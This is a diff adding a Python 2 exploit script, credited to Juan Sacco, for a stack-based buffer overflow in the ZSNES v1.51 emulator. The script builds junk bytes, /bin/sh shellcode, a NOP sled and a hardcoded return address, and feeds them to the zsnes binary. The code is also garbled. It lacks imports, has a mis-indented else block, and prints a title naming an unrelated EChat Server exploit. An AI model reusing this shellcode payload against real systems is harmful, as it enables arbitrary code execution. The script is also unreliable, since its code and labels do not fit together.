@@ -1,0 +1,45 @@
+# Exploit Author: Juan Sacco - http://www.exploitpack.comp <jsacco@exploitpack.com>
+# Tested on: GNU/Linux - Kali Linux 2.0
+# Description: ZSNES v1.51 and prior is prone to a stack-based buffer overflow
+# vulnerability because the application fails to perform adequate
+# boundary-checks on user-supplied input.
+#
+# An attacker could exploit this issue to execute arbitrary code in the
+# context of the application. Failed exploit attempts will result in a
+# denial-of-service condition.
+#
+# Vendor homepage: http://www.zsnes.com
+# Kali Linux 2.0 package: 1.510+bz2-8 (/var/lib/apt/lists/http.kali.org_kali_dists_sana_main_binary-i386_Packages)
+# MD5: 23c1e4d12b6b8895961a29f2fd91570b
+
+def run():
+  try:
+    print "# ZSNES v1.51 Stack-BoF by Juan Sacco"
+    print "# Wasting CPU clocks on unusable exploits"
+    print "# This exploit is for educational purposes only"
+    # Basic structure: JUNK + SHELLCODE + NOPS + EIP
+    junk = "\x41"*8
+    shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+    nops = "\x90"*589
+    eip = "\x10\xf0\xff\xbf"
+
+    subprocess.call(["zsnes", junk + shellcode + nops + eip])
+
+  except OSError as e:
+    if e.errno == os.errno.ENOENT:
+        print "ZSNES not found!"
+    else:
+    print "Error executing exploit"
+    raise
+
+def howtousage():
+  print "Sorry, something went wrong"
+  sys.exit(-1)
+
+if __name__ == '__main__':
+  try:
+    print "Exploit EChat Server <= v2.5 Remote Buffer Overflow Exploit"
+    print "Author: Juan Sacco (Runlvl)"
+  except IndexError:
+    howtousage()
+run()
